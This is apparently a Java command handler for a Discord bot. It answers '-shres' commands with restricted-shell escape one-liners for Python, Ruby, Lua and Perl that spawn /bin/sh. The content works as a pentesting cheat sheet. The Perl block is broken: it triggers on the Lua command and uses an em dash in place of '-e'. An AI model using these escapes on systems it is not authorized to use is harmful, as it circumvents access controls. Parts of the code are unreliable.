package com.daskama.shelby.comands;

import com.daskama.shelby.Core.GenerateFooterInviteLink;
import com.daskama.shelby.config_program.ConfigAll;

import java.awt.Color;

import org.javacord.api.entity.message.Message;
import org.javacord.api.entity.message.MessageAuthor;
import org.javacord.api.entity.message.MessageBuilder;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.listener.message.MessageCreateListener;

import java.util.concurrent.TimeUnit;

public class ComanndShellbyRestrictedshell implements MessageCreateListener {

    private ConfigAll config; // config
    private GenerateFooterInviteLink generatorInvite;


    /**
     * Commands Restricted Shell
     *
     * @param event
     */
    public void onMessageCreate(MessageCreateEvent event) {
        config = new ConfigAll();
        generatorInvite = new GenerateFooterInviteLink();


        Message spravaRestrict = event.getMessage();
        MessageAuthor author = event.getMessage().getAuthor();

        /**#############################
         #                             #
         #    Program Language         #
         #                             #
         ###############################
         **/

        //python
        if (spravaRestrict.getContent().equalsIgnoreCase("-shres python")) {
            long idSaved = author.getId(); // save ID user
            new MessageBuilder()
                .setEmbed(new EmbedBuilder()
                    .setTitle("** #Python Restricted Shell**")
                    .setDescription("Use this code in python : \n" +
                        "```__import__(\"os\").system(\"/bin/sh\")```\n"
                        + ""
                        + generatorInvite.generateFooterInviteLinks())
                    .setTimestampToNow()
                    .setColor(new Color(95, 212, 96)))
                .send(event.getChannel()).thenAccept(messageNew -> {

                messageNew.addReactionAddListener(reactionEvent -> {

                    if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Python Restricted Shell**")
                            .setDescription("Use this code in python : \n" +
                                "```__import__(\"os\").system(\"/bin/sh\")```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Python Restricted Shell Alternative 1 **")
                            .setDescription("**Use this code in python : **\n "
                                + "```__import__('subprocess').run([\"ls\",\"-l\"])```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("2\uFE0F\u20E3") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Python Restricted Shell Alternative 2 **")
                            .setDescription("Use this code in shell : \n" +
                                "```python -c 'import os; os.system(\"/bin/sh\")'```"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("3\uFE0F\u20E3") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Python Restricted Shell Alternative 3 **")
                            .setDescription("Use this code in shell : \n" +
                                "```python -c 'import pty; pty.spawn(\"/bin/sh\")'```"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    }
                }).removeAfter(config.getTimeEventerInt(), TimeUnit.MINUTES);
                messageNew.addReaction("1\uFE0F\u20E3");
                messageNew.addReaction("2\uFE0F\u20E3");
                messageNew.addReaction("3\uFE0F\u20E3");
                messageNew.addReaction("\uD83C\uDFE0");

            });
        }
        ;


        //Ruby
        if (spravaRestrict.getContent().equalsIgnoreCase("-shres ruby")) {
            long idSaved = author.getId(); // save ID user
            new MessageBuilder()
                .setEmbed(new EmbedBuilder()
                    .setTitle("** #Ruby Restricted Shell **")
                    .setDescription("Use this code in Ruby : \n" +
                        "``` ruby -e 'exec \"/bin/sh\"' ```\n"
                        + generatorInvite.generateFooterInviteLinks())
                    .setTimestampToNow()
                    .setColor(new Color(95, 212, 96)))
                .send(event.getChannel()).thenAccept(message_new -> {

                message_new.addReactionAddListener(reactionEvent -> {

                    if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Ruby Restricted Shell **")
                            .setDescription("Use this code in Ruby : \n" +
                                "``` ruby -e 'exec \"/bin/sh\"' ```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("**#Ruby Restricted Shell Alternative 1 **")
                            .setDescription(
                                "Use this code in shell : "
                                    + "```exec \"/bin/sh\"; ```\n"
                                    + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    }
                }).removeAfter(config.getTimeEventerInt(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
            });
        }
        ;


        //Lua
        if (spravaRestrict.getContent().equalsIgnoreCase("-shres lua")) {
            long id_saved = author.getId(); // save ID user
            new MessageBuilder()
                .setEmbed(new EmbedBuilder()
                    .setTitle("** #Lua Restricted Shell **")
                    .setDescription("Use this code in shell :\n" +
                        "```lua -e 'os.execute(\"/bin/sh\")'```\n"
                        + generatorInvite.generateFooterInviteLinks())
                    .setTimestampToNow()
                    .setColor(new Color(95, 212, 96)))
                .send(event.getChannel()).thenAccept(message_new -> {

                message_new.addReactionAddListener(reactionEvent -> {

                    if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") &&
                        reactionEvent.getUserId() == id_saved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Lua Restricted Shell **")
                            .setDescription("Use this code in shell\n" +
                                "```lua -e 'os.execute(\"/bin/sh\")'```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") &&
                        reactionEvent.getUserId() == id_saved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("**#Lua Restricted Shell Alternative 1 **")
                            .setDescription("Use this code in Lua\n" +
                                "```os.execute('/bin/sh')```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    }
                }).removeAfter(config.getTimeEventerInt(), TimeUnit.MINUTES);
                message_new.addReaction("1\uFE0F\u20E3");
                message_new.addReaction("\uD83C\uDFE0");
            });
        }
        ;


        //Perl
        if (spravaRestrict.getContent().equalsIgnoreCase("-shres lua")) {
            long idSaved = author.getId(); // save ID user
            new MessageBuilder()
                .setEmbed(new EmbedBuilder()
                    .setTitle("** #Perl Restricted Shell **")
                    .setDescription("Use this code in shell :\n" +
                        "```perl —e 'exec \"/bin/sh\";' ```\n"
                        + generatorInvite.generateFooterInviteLinks())
                    .setTimestampToNow()
                    .setColor(new Color(95, 212, 96)))
                .send(event.getChannel()).thenAccept(messageNew -> {

                messageNew.addReactionAddListener(reactionEvent -> {

                    if (reactionEvent.getEmoji().equalsEmoji("\uD83C\uDFE0") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("** #Perl Restricted Shell **")
                            .setDescription("Use this code in shell\n" +
                                "```perl —e 'exec \"/bin/sh\";'```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    } else if (reactionEvent.getEmoji().equalsEmoji("1\uFE0F\u20E3") &&
                        reactionEvent.getUserId() == idSaved) {
                        reactionEvent.editMessage(new EmbedBuilder()
                            .setTitle("**#Perl Restricted Shell Alternative 1 **")
                            .setDescription("Use this code in perl\n" +
                                "```exec \"/bin/sh\";```\n"
                                + generatorInvite.generateFooterInviteLinks())
                            .setColor(new Color(95, 212, 96))
                        );
                    }
                }).removeAfter(config.getTimeEventerInt(), TimeUnit.MINUTES);
                messageNew.addReaction("1\uFE0F\u20E3");
                messageNew.addReaction("\uD83C\uDFE0");
            });
        }
        ;

        /**#############################
         #                             #
         #    Common Techniques        #
         #                             #
         ###############################
         **/


    }
}

